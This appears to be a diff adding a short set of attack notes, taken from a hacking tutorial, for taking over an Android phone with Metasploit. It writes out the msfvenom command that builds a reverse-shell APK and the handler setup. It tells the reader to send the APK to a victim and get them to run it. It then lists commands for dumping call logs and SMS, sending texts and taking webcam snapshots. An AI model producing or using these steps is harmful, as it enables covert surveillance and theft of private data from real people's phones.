@@ -1,0 +1,21 @@
+https://www.hackingarticles.in/hack-call-logs-sms-camera-remote-android-phone-using-metasploit/
+
+msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 > shell.apk (send this payload to target mobile)
+------------------------------------------------------------------------------------------------------------------------------------
+
+in kali:
+As the msfvenom malware is created, start the handler in order to have a session and for this type :
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.1.109
+set lport 1234
+exploit
+
+Once the exploit is executed, send the APK file to the victim and make sure to run the file in their android phone
+
+check_root - check the root folder
+dump_calllog - check all call logs
+send_sms -d 95******** -t hacked - send the sms
+webcam_snap - take the webcam snap
+dump_sms - check the sms
